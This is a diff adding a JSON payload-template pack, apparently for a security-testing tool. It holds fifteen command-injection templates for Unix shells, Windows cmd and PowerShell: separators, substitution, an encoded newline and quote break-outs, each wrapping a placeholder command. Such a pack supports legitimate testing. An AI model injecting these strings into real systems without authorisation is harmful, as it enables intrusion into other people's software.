@@ -1,0 +1,159 @@
+{
+  "pack": "builtin-cmdi",
+  "category": "command_injection",
+  "source": "builtin",
+  "license": "MIT",
+  "templates": [
+    {
+      "id": "cmdi-unix-semicolon",
+      "name": "Unix semicolon separator",
+      "category": "command_injection",
+      "platform": "linux",
+      "context": "unix",
+      "template": "; <<POAD_COMMAND>>",
+      "required": ["command"],
+      "tags": ["separator"]
+    },
+    {
+      "id": "cmdi-unix-pipe",
+      "name": "Unix pipe",
+      "category": "command_injection",
+      "platform": "linux",
+      "context": "unix",
+      "template": "| <<POAD_COMMAND>>",
+      "required": ["command"],
+      "tags": ["separator"]
+    },
+    {
+      "id": "cmdi-unix-or",
+      "name": "Unix logical OR",
+      "category": "command_injection",
+      "platform": "linux",
+      "context": "unix",
+      "template": "|| <<POAD_COMMAND>>",
+      "required": ["command"],
+      "tags": ["separator"]
+    },
+    {
+      "id": "cmdi-unix-and",
+      "name": "Unix logical AND",
+      "category": "command_injection",
+      "platform": "linux",
+      "context": "unix",
+      "template": "&& <<POAD_COMMAND>>",
+      "required": ["command"],
+      "tags": ["separator"]
+    },
+    {
+      "id": "cmdi-unix-background",
+      "name": "Unix background separator",
+      "category": "command_injection",
+      "platform": "linux",
+      "context": "unix",
+      "template": "& <<POAD_COMMAND>>",
+      "required": ["command"],
+      "tags": ["separator"]
+    },
+    {
+      "id": "cmdi-unix-subshell",
+      "name": "Unix command substitution",
+      "category": "command_injection",
+      "platform": "linux",
+      "context": "unix",
+      "template": "$(<<POAD_COMMAND>>)",
+      "required": ["command"],
+      "tags": ["substitution"]
+    },
+    {
+      "id": "cmdi-unix-backtick",
+      "name": "Unix backtick substitution",
+      "category": "command_injection",
+      "platform": "linux",
+      "context": "unix",
+      "template": "`<<POAD_COMMAND>>`",
+      "required": ["command"],
+      "tags": ["substitution"]
+    },
+    {
+      "id": "cmdi-unix-newline",
+      "name": "Unix encoded newline",
+      "category": "command_injection",
+      "platform": "linux",
+      "context": "unix",
+      "template": "%0a<<POAD_COMMAND>>",
+      "required": ["command"],
+      "tags": ["separator"],
+      "notes": "URL-encoded newline; keep Burp from re-encoding the % if used as-is."
+    },
+    {
+      "id": "cmdi-unix-quote-single",
+      "name": "Unix single-quote break-out",
+      "category": "command_injection",
+      "platform": "linux",
+      "context": "unix-quoted",
+      "template": "'; <<POAD_COMMAND>>; '",
+      "required": ["command"],
+      "tags": ["quoting"]
+    },
+    {
+      "id": "cmdi-unix-quote-double",
+      "name": "Unix double-quote break-out",
+      "category": "command_injection",
+      "platform": "linux",
+      "context": "unix-quoted",
+      "template": "\"; <<POAD_COMMAND>>; \"",
+      "required": ["command"],
+      "tags": ["quoting"]
+    },
+    {
+      "id": "cmdi-win-amp",
+      "name": "Windows cmd ampersand",
+      "category": "command_injection",
+      "platform": "windows",
+      "context": "cmd",
+      "template": "& <<POAD_COMMAND>>",
+      "required": ["command"],
+      "tags": ["separator"]
+    },
+    {
+      "id": "cmdi-win-and",
+      "name": "Windows cmd AND",
+      "category": "command_injection",
+      "platform": "windows",
+      "context": "cmd",
+      "template": "&& <<POAD_COMMAND>>",
+      "required": ["command"],
+      "tags": ["separator"]
+    },
+    {
+      "id": "cmdi-win-pipe",
+      "name": "Windows cmd pipe",
+      "category": "command_injection",
+      "platform": "windows",
+      "context": "cmd",
+      "template": "| <<POAD_COMMAND>>",
+      "required": ["command"],
+      "tags": ["separator"]
+    },
+    {
+      "id": "cmdi-win-or",
+      "name": "Windows cmd OR",
+      "category": "command_injection",
+      "platform": "windows",
+      "context": "cmd",
+      "template": "|| <<POAD_COMMAND>>",
+      "required": ["command"],
+      "tags": ["separator"]
+    },
+    {
+      "id": "cmdi-ps-semicolon",
+      "name": "PowerShell semicolon",
+      "category": "command_injection",
+      "platform": "windows",
+      "context": "powershell",
+      "template": "; <<POAD_COMMAND>>",
+      "required": ["command"],
+      "tags": ["separator"]
+    }
+  ]
+}
